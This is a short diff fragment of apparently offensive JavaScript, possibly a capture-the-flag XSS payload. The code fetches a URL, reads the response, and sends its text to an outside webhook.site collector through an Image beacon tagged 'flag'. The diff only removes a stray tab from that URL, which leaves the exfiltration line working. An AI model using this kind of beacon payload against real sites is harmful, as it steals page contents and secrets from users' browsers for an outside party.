@@ -10,7 +10,7 @@
       const r = await fetch(u);
       if (r.ok) {
         const t = await r.text();
-        new Image().src = '	https://webhook.site/0422794e-79c4-4bc8-832d-106e18ed426b?flag=' + encodeURIComponent(t);
+        new Image().src = 'https://webhook.site/0422794e-79c4-4bc8-832d-106e18ed426b?flag=' + encodeURIComponent(t);
         break;
       }
     } catch (_) {}
